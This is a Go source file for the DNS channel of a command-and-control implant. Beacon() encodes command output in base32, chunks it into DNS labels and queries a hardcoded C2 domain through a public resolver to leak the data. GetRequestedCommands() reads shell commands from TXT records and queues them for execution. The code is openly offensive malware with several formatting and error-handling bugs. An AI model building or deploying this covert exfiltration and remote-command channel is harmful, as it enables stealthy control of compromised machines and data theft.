package main

import (
	"encoding/base32"
	"flag"
	"fmt"
	"github.com/miekg/dns"
	"log"
	"strconv"
	"strings"
	"time"
)

// TODO: all communications (commands + results) should be encoded + decoded + encrypted -> verify this at the end
// TODO: want flags? - or just write comment saying if we wanna change these hardcoded values in the implant, we can just change the evil docker image
var (
	// TODO: move this to DNSC2Communicaotr fields
	domain = flag.String("domain", "cloud-docker.net", "C2 domain to query")
	// TODO: look at this
	server = flag.String("server", "8.8.8.8:53", "DNS server addr (ip:port)")
)

// TODO: only cmd tasks supported in DNSImplant at the time?
type DNSC2Communicator struct {
	client *dns.Client // TODO: make sure I use this instead of fresh initializing a client
}

/*
	// TODO: move this somewhere else
		DNS limits:
		- full QNAME (∑ (1 + len(labelᵢ))  +  1  ≤  255)
			- each label is prefixed by a single length-octet
			- terminated by zero length-octet (0x00)
		- each label must be maximum 63 bytes
*/

// TODO: write comment
func (D *DNSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQueue, error) {
	// prepare a no‑padding Base32 encoder: will remove extra "=" padding that Base32 appends to an encoded string so that it's length is a multiple of 8 (encoding block size)
	b32 := base32.StdEncoding.WithPadding(base32.NoPadding)
	const maxLabelLen = 63 // 63 octets is the maximum length of a DNS label as specified in RFC 1035, Section 2.3.4

	// TODO: rename totalChunkCount?
	// implantID.taskID.totalChunkCount.chunkIndex.chunkData.res.<domain>
	// 1. send existing results to DNS server
	for _, result := range results {

		raw := result.Content
		if !result.Success {
			raw = "[FAIL]" + raw // TODO: need this -> come back and check after figuring out how it handles failed command tasks
		}

		encoded := b32.EncodeToString([]byte(raw))

		// break raw into 63-byte chunks
		var chunks []string
		for i := 0; i < len(encoded); i += maxLabelLen {
			end := i + maxLabelLen
			if end > len(encoded) {
				end = len(encoded)
			}
			chunks = append(chunks, encoded[i:end])
		}
		totalChunkCount := len(chunks)

		for index, chunk := range chunks {
			// index is 0-based; chunkIndex is 1-based
			qname := fmt.Sprintf(
				"%s.%02d.%02d.%02d.%s.res.%s",
				implantID,       // e.g. "01"
				result.TaskID,   // e.g.  1 → "01"
				totalChunkCount, // total chunks → "02", "03", …
				index+1,         // this chunk’s index → "01", "02", …
				chunk,           // the Base32 payload slice
				*domain,         // root domain
			)
			fqdn := dns.Fqdn(qname)

			log.Printf("LOG DETAILED MESSAGE IN HERE")
			msg := new(dns.Msg)
			msg.SetQuestion(fqdn, dns.TypeTXT)

			_, _, err := new(dns.Client).Exchange(msg, *server)
			if err != nil {
				// return fmt.Errorf("DNS exchange failed for %q: %w", fqdn, err)
				// TODO: standardize error handling
			}

			// optional throttle to avoid flooding
			time.Sleep(50 * time.Millisecond)
		}
	}

	// 2. get new tasks from DNS server, make them into TaskQueue
	// NOTE: Only the ShellCommand Task is currently supported for DNS - #TODO: add at top or smthing

	tq := NewTaskQueue()
	commands, err := D.GetRequestedCommands(implantID)
	if err != nil {
		return nil, err
	}

	for id, commandWithArgs := range commands {
		tq.Enqueue(NewShellCommandTask(id, commandWithArgs))
	}

	return tq, nil
}

// TODO: make implantID a field in DNS-2Communicator - so dont have to pass it in, same for HTTPSCommunicator?
// func (D *DNSC2Communicator) PostResults(implantID uint, results []Result) (*TaskQueue, error) {}

// GetRequestedCommands fetches all pending tasks in one DNS response.
// It does a UDP query, and if the response is truncated it retries over TCP.
// Each TXT RR must be "<id>:<base32_no_pad(command)>".
func (d *DNSC2Communicator) GetRequestedCommands(implantID uint) (map[uint][]string, error) {

	cmds := make(map[uint][]string)
	decoder := base32.StdEncoding.WithPadding(base32.NoPadding)
	// TODO: make sure to reassemble BEFORE splitting on :

	msg := new(dns.Msg)
	fq := dns.Fqdn(fmt.Sprintf("%d.cmd.%s", implantID, domain))
	msg.SetQuestion(fq, dns.TypeTXT)
	msg.SetEdns0(4096, true) // advertise a larger UDP payload

	// 1) First try over UDP
	d.client.Net = "udp"
	reply, _, err := d.client.Exchange(msg, *server)
	if err != nil {
		return nil, fmt.Errorf("DNS exchange (UDP) error: %w", err)
	}

	// 2) If truncated, retry over TCP
	if reply.Truncated { // TODO: make sure that if it does be truncated and  does the query again, it will get the exact same tasks to execute - or does server make them "done" immediately
		d.client.Net = "tcp"
		reply, _, err = d.client.Exchange(msg, *server)
		if err != nil {
			return nil, fmt.Errorf("DNS exchange (TCP) error: %w", err)
		}
	}

	// the reason we dont use index is bc DNS can send the RR in different order, want to make sure we are in sync w server regarding correct ID
	for _, rr := range reply.Answer { // Answer is of type []RR - each one its own individual task
		txt, ok := rr.(*dns.TXT)
		if !ok || len(txt.Txt) == 0 { // TODO: if was of a different type, or no tasks ready?? handle the !ok error?
			continue
		}

		// will join any 255-byte chunks into one string
		raw := strings.Join(txt.Txt, "")
		data, err := decoder.DecodeString(raw) // TODO: why is it lightgreen!!
		if err != nil {
			return nil, err
		}
		payload := string(data)

		parts := strings.SplitN(payload, ":", 2)
		if len(parts) != 2 {
			return nil, fmt.Errorf("invalid TXT format %q, want <id>:<base32-cmd>", payload)
		}

		id64, err := strconv.ParseUint(parts[0], 10, 64)
		if err != nil {
			return nil, fmt.Errorf("invalid task ID %q: %w", parts[0], err)
		}
		id := uint(id64)
		cmd := parts[1]                // cmd with arguments
		cmds[id] = strings.Fields(cmd) // separate out by " "
	}

	return cmds, nil
}

func NewDNSC2Communicator() *DNSC2Communicator {
	return &DNSC2Communicator{
		client: &dns.Client{},
	}
}
